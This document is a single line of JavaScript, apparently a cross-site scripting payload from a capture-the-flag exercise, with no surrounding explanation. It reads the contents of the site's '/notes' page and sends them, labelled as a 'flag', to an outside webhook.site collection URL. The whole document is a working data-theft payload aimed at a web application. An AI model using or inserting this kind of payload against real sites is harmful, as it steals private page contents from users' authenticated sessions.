fetch('/notes').then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)));
